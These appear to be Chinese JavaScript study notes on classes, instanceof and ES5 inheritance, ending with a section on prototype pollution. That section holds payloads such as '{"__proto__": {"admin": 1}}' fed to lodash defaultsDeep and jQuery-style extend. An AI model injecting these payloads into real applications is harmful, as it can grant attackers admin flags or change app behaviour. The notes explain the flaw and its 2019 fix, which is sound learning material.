## class

### 遍历数组

```js
class classA {
  constructor() {}

  playOrg() {
    console.log("playOrgClaseFn");
  } // 类的内部所有定义的方法，都是不可枚举的
}

/**
 * class 是语法糖，和es5一样靠原型链实现。
 * 所以可以用es5的assign给class加方法，
 * 但是这样普通赋值属性的方法，在生成对象上可枚举
 * */
Object.assign(classA.prototype, {
  // Object.assign()拷贝的是（可枚举）属性值
  play() {
    console.log("palyFnDo");
  },
});
// 但是这里是Object.assign的方法格式, 这里面需要往Point.prototype里面添加的方法就需要符合对象的默认格式

let p = new classA();

for (let o in p) {
  console.log(o); // play
}

p.playOrg(); // playOrgClaseFn
p.play(); // palyFnDo
```

class 内部的方法中是局部严格模式，外部调也同样，console.log（this） 不会默认指向 window，而是 undefined

### instanceof

用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上。

语法：object instanceof constructor
object：某个实例对象
constructor：某个构造函数

```javascript
// 定义构造函数
function C() {}
function D() {}
// 实例化一个 o 对象
var o = new C();
// true，true --> C.prototype 在 o 的原型链上
console.log(
  o instanceof C,
  o.__proto__ === C.prototype,
  "此时 o 的 __proto__：",
  o.__proto__,
  "此时 C 的 prototype：",
  C.prototype
);
// false，false --> D.prototype 不在 o 的原型链上
console.log(o instanceof D, o.__proto__ === D.prototype);
// true true --> Object.prototype 在 o 的原型链上
console.log(o instanceof Object, o.__proto__.__proto__ === Object.prototype);
// 这时我们修改构造函数 C 的原型为一个空对象
C.prototype = {};
// 实例化一个 o2 对象
var o2 = new C();
// true --> C.prototype 在 o2 的原型链上
console.log(o2 instanceof C);
// false，C.prototype 指向了一个空对象,这个空对象不在 o 的原型链上.
console.log(
  o instanceof C,
  "此时 o 的 __proto__：",
  o.__proto__,
  "此时 C 的 prototype：",
  C.prototype
);
console.log("此时 D 的 prototype：", D.prototype);
// 继承
D.prototype = new C(); // new 出来的对象的__proto__ = C.prototype
console.log("此时 D 的 prototype：", D.prototype);
var o3 = new D();
// true, true --> 因为 o3 是 构造函数 D new 出来的实例对象，所以 D.prototype 一定在 o3 的原型链上
console.log(o3 instanceof D, o3.__proto__ === D.prototype);
// true --> 因为 C.prototype 现在在 o3 的原型链上
console.log(o3 instanceof C);
// true,true --> 上面的结果为什么为 true 呢，看如下代码，D.prototype 是 构造函数 C new 出来的实例对象，
// 所以 C.prototype 一定在 D.prototype 的原型链上
console.log(
  o3.__proto__ === D.prototype,
  D.prototype.__proto__ === C.prototype
);
// true 相当于如下代码
console.log(o3.__proto__.__proto__ === C.prototype);
```

```javascript
var simpleStr = "This is a simple string";
var myString = new String();
var newStr = new String("String created with constructor");
var myDate = new Date();
var myObj = {};
var myNonObj = Object.create(null); // Object.create(null) 会造成创建的对象其 __proto__ 指向为空

// 返回 false, simpleStr 并不是对象
simpleStr instanceof String;
// 返回 true
myString instanceof String;
// 返回 true
newStr instanceof String;
// 返回 true
myString instanceof Object;
// 返回 true
myObj instanceof Object;
// 返回 true
({} instanceof Object);
// 返回 false, 一种创建非 Object 实例的对象的方法，最终不会指到Object>prototype
myNonObj instanceof Object;
// 返回 false
myString instanceof Date;
// 返回 true
myDate instanceof Date;
// 返回 true
myDate instanceof Object;
// 返回 false
myDate instanceof String;
```

自定义 instanceof 行为

```javascript
class PrimitiveNumber {
  static [Symbol.hasInstance](x) {
    // 重写Symbol.hasInstance
    return typeof x === "number";
  }
}
// true
console.log(111 instanceof PrimitiveNumber);
```

手动实现 instanceof 的功能

```javascript
function copyInstanceof(source, target) {
  // 基本数据类型以及 null 直接返回 false
  if (!["function", "object"].includes(typeof source) || source === null)
    return false;
  // getProtypeOf 是 Object 对象自带的一个方法，能够拿到参数的原型对象
  let proto = Object.getPrototypeOf(source);
  while (true) {
    // 查找到尽头，还没找到
    if (proto == null) return false;
    // 找到相同的原型对象
    if (proto == target.prototype) return true;
    proto = Object.getPrototypeOf(proto);
  }
}

console.log(copyInstanceof("111", String)); // false
console.log(copyInstanceof(new String("111"), String)); // true
console.log(copyInstanceof(Date, Function)); // true
console.log(copyInstanceof(null, Object)); // false
```

### ES5 继承

```javascript
// 定义一个动物类
function Animal(name) {
  // 属性
  this.name = name || "Animal";
  // 实例方法
  this.sleep = function () {
    console.log(this.name + "正在睡觉！");
  };
}
// 原型方法
Animal.prototype.eat = function (food) {
  console.log(this.name + "正在吃：" + food);
};
```

1. 原型链继承

```javascript
function Animal(name) {
  // 属性
  this.name = name || "Animal";
  // 实例方法
  this.sleep = function () {
    console.log(this.name + "正在睡觉！");
  };
}
// 原型方法
Animal.prototype.eat = function (food) {
  console.log(this.name + "正在吃：" + food);
};

function Cat(name) {
  Animal.call(this);
  this.name = name || "Tom";
}
Cat.prototype = new Animal();
Cat.prototype.constructor = Animal;
var cat = new Cat();

console.log(cat instanceof Animal); // true
console.log(cat instanceof Cat); // true
// 感谢 @学无止境c 的提醒，组合继承也是需要修复构造函数指向的。

Cat.prototype.constructor = Cat;

// Test Code
var cat = new Cat();
console.log(cat.name);
console.log(cat.sleep());
console.log(cat instanceof Animal); // true
console.log(cat instanceof Cat); // true

function Cat() {}
Cat.prototype = new Animal();
Cat.prototype.name = "cat";
Cat.prototype.constructor = "dog";

//　Test Code
var cat = new Cat();
console.log(cat.name);
console.log(cat.eat("fish"));
console.log(cat.sleep());
console.log(cat instanceof Animal); //true
console.log(cat instanceof Cat); //true
```

继承

```javascript
function A() {}
function B() {}
function C() {}
const b = new B();
const c = new C();
A.prototype = b;
A.prototype = c;
// A.prototype.constructor = A // 现在不用修复了？

const a = new A();

console.log(a.constructor); // fn C
console.log(a.__proto__.constructor); // fn C
console.log(a instanceof A); //true
console.log(a instanceof B); //false
console.log(a instanceof C); //true

console.log(a.__proto__ === c); // true
console.log(a.__proto__.__proto__ === c); // false
console.log(a.__proto__.__proto__ === C); // false
console.log(a.__proto__.__proto__ === C.prototype); // true
console.log(a.__proto__.__proto__.constructor === C); // true
```

function Animal(name) {
// 属性
this.name = name || "Animal";
// 实例方法
this.sleep = function () {
console.log(this.name + "正在睡觉！");
};
}
// 原型方法
Animal.prototype.eat = function (food) {
console.log(this.name + "正在吃：" + food);
};
function Cat(name){
Animal.call(this);
this.name = name || 'Tom';
}
(function(){
// 创建一个没有实例方法的类
var Super = function(){};
Super.prototype = Animal.prototype;
//将实例作为子类的原型
Cat.prototype = new Super();
})();

// Test Code
var cat = new Cat();
console.log(cat.name);
console.log(cat.sleep());
console.log(cat instanceof Animal); // true
console.log(cat instanceof Cat); //true

console.log('Cat.prototype.constructor',Cat.prototype.constructor)

lodash 原型污染漏洞

```javascript
const payload = '{"constructor": {"prototype": {"toString": true}}}';

_.defaultsDeep({}, JSON.parse(payload));
```

```javascript
// person 是一个简单的 JavaScript 对象
let person = { name: "lucas" };
// 输出 lucas
console.log(person.name);
// 修改 person 的原型
person.__proto__.name = "messi";
// 由于原型链顺序查找的原因，person.name 仍然是 lucas
console.log(person.name);
// 再创建一个空的 person2 对象
let person2 = {};
// 查看 person2.name，输出 messi
console.log(person2.name);

const isObject = (obj) => obj && obj.constructor && obj.constructor === Object;
function merge(a, b) {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a;
}
function clone(a) {
  return merge({}, a);
}

let req = '{"__proto__": {"admin": 1}}';
var body = JSON.parse(JSON.stringify(req));
var copybody = clone(body);

let admin = {};
console.log(admin, admin.admin);
```

```javascript
const payload = "{"constructor": {"prototype": {"toString": true}}}"
defaultsDeep({}, JSON.parse(payload))
```

function A (){}
const a = new A()
a.a={a:2}
toString.call(a)

```javascript
const hasOwn = {}.hasOwnProperty;
const isPlainObject = function (obj) {
  var proto, Ctor;

  // 判断是对象
  // Detect obvious negatives
  // Use toString instead of jQuery.type to catch host objects
  if (!obj || toString.call(obj) !== "[object Object]") {
    return false;
  }

  proto = Object.getPrototypeOf(obj);

  // Objects with no prototype (e.g., `Object.create( null )`) are plain
  if (!proto) {
    return true;
  }

  // Objects with prototype are plain if they were constructed by a global Object function
  Ctor = {}.hasOwnProperty.call(proto, "constructor") && proto.constructor;
  console.log("hasOwn", hasOwn);
  console.log("hasOwn.toString", hasOwn.toString);
  console.log("hasOwn.toString.call( Object )", hasOwn.toString.call(Object));
  return (
    typeof Ctor === "function" &&
    hasOwn.toString.call(Ctor) === hasOwn.toString.call(Object)
  );
};
const extend = function () {
  var options,
    name,
    src,
    copy,
    copyIsArray,
    clone,
    target = arguments[0] || {},
    i = 1,
    length = arguments.length,
    deep = false;

  // Handle a deep copy situation
  if (typeof target === "boolean") {
    deep = target;

    // Skip the boolean and the target
    target = arguments[i] || {};
    i++;
    console.log("i", i);
  }

  // Handle case when target is a string or something (possible in deep copy)
  if (typeof target !== "object") {
    // if ( typeof target !== "object" && !isFunction( target ) ) {
    target = {};
  }

  // Extend jQuery itself if only one argument is passed
  if (i === length) {
    target = this;
    i--;
  }
  console.log("i_for", i);

  for (; i < length; i++) {
    // Only deal with non-null/undefined values
    if ((options = arguments[i]) != null) {
      // Extend the base object
      for (name in options) {
        copy = options[name];
        console.log("copy", JSON.stringify(copy), copy);
        // Prevent never-ending loop 目标对象与拷贝对象的属性相同时会产生循环引用
        if (target === copy) {
          // if ( name === "__proto__" || target === copy ) {
          console.log("proto");
          continue;
        }
        console.log("isPlainObject( copy ) ", isPlainObject(copy));
        // Recurse if we're merging plain objects or arrays
        if (
          deep &&
          copy &&
          (isPlainObject(copy) || (copyIsArray = Array.isArray(copy)))
        ) {
          src = target[name];

          // Ensure proper type for the source value
          if (copyIsArray && !Array.isArray(src)) {
            clone = [];
          } else if (!copyIsArray && !isPlainObject(src)) {
            clone = {};
          } else {
            clone = src;
          }
          copyIsArray = false;

          // Never move original objects, clone them
          target[name] = extend(deep, clone, copy);

          // Don't bring in undefined values
        } else if (copy !== undefined) {
          target[name] = copy;
        }
      }
    }
  }

  // Return the modified object
  return target;
};

extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log("json", JSON.parse('{"__proto__": {"devMode": true}}'));

console.log(!("devMode" in {}), "Object.prototype not polluted", {});

let a = {};
a["__proto__"] = { self: true };
console.log({});

let t = {};
t["__proto__"] = JSON.parse('{"__proto__": {"devMode": true}}');
console.log(!("devMode" in {}), "Object.prototype not polluted", {});

let t = {};
let c = JSON.parse('{"__proto__": {"devMode": true}}');
for (name in c) {
  console.log(c[name]);
  t[name] = c[name];
}
console.log(!("devMode" in {}), "Object.prototype not polluted", {});
```

```javascript
const hasOwn = {}.hasOwnProperty;
const isPlainObject = function (obj) {
  // 判断是对象
  if (!obj || toString.call(obj) !== "[object Object]") {
    return false;
  }
  return true;
};
const extend = function () {
  var options,
    name,
    src,
    copy,
    copyIsArray,
    clone,
    i = 2,
    length = arguments.length;
  deep = arguments[0];
  target = arguments[1];
  for (; i < length; i++) {
    // Only deal with non-null/undefined values
    if ((options = arguments[i]) != null) {
      // Extend the base object
      for (name in options) {
        copy = options[name];
        // Prevent never-ending loop 目标对象与拷贝对象的属性相同时会产生循环引用
        if (target === copy) {
          // if ( name === "__proto__" || target === copy ) {
          console.log("proto");
          continue;
        }
        console.log("isPlainObject( copy ) ", isPlainObject(copy));
        // Recurse if we're merging plain objects or arrays
        if (
          deep &&
          copy &&
          (isPlainObject(copy) || (copyIsArray = Array.isArray(copy)))
        ) {
          console.log("target1", JSON.stringify(target),'name',JSON.stringify(name));

          src = target[name];

          // Ensure proper type for the source value
          if (copyIsArray && !Array.isArray(src)) {
            console.log('clone = []',JSON.stringify([]),'to',JSON.stringify(clone))
            clone = [];
          } else if (!copyIsArray && !isPlainObject(src)) {
            console.log('clone = {}',JSON.stringify({}),'to',JSON.stringify(clone))
            clone = {};
          } else {
            console.log('clone = src',JSON.stringify(src),'to',JSON.stringify(clone))
            clone = src;
          }
          copyIsArray = false;

          console.log("copyObj", JSON.stringify(copy),'to',JSON.stringify(clone));
          console.log("target", JSON.stringify(target),'name',JSON.stringify(name));
          // Never move original objects, clone them
          target[name] = extend(deep, clone, copy);

          // Don't bring in undefined values
        } else if (copy !== undefined) {

          console.log("copyNotObj", JSON.stringify(copy), copy,'to',JSON.stringify(target[name]), target[name]);
          console.log("target", JSON.stringify(target), copy,'name',JSON.stringify(name));
          target[name] = copy;
        }
      }
    }
  }

  // Return the modified object
  return target;
};

extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));

console.log(!("devMode" in {}), "Object.prototype not polluted", {});
console.log("json", JSON.parse('{"__proto__": {"devMode": true}}'));
```

关键简写
```javascript
let target = {}
let src = target['__proto__']
extendAgain = (t,c) =>{
  t['devMode'] = true
}
target['__proto__'] = extendAgain(target['__proto__'],{"devMode":true})

// extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));

console.log(!("devMode" in {}), "Object.prototype not polluted", {});
```

关键简写
```javascript
let target = {}
let src = target['__proto__']
extendAgain = (t,c) =>{
  t['devMode'] = true
}
// target['__proto__'] = extendAgain(target['__proto__'])
extendAgain(target['__proto__'])

// extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));

console.log(!("devMode" in {}), "Object.prototype not polluted", {});
```

关键简写

如果人家框架有自己写的for in 遍历创造或者合并对象，没有屏蔽掉__proto__，
就会有污染全局对象的漏洞
```javascript
let target = {}
target['__proto__']['devMode']=true
console.log(!("devMode" in {}), "Object.prototype not polluted", {});
```
只要中间执行 这段代码的第二行，全局所有以字面量{a:0}创建的对象都会受到污染。 jquery 和 lodash19年的时候修复了这个漏洞，就是加了这个判断。